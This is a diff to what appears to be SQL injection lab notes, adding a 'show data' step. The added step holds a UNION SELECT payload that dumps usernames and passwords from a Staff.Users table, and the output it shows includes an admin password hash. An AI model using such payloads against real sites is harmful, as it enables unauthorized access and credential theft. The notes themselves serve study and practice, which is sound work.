@@ -6,6 +6,7 @@
   * [enumerate databases](#enumerate-databases)
   * [enumerate tables](#enumerate-tables)
   * [enumerate columns](#enumerate-columns)
+  * [show data](#show-data)
 
 # `sqlmap`
 
@@ -73,4 +74,12 @@ search=killer' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 FROM INFORMATION
 ```
 <h3>Search results </h3>
 ID: UserID,Username,Password<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
+```
+## show data
+```
+search=killer' UNION SELECT GROUP_CONCAT(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- -
+```
+```
+<h3>Search results </h3>
+ID: admin:856f5de590ef37314e7c3bdf6f8a66dc<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
 ```
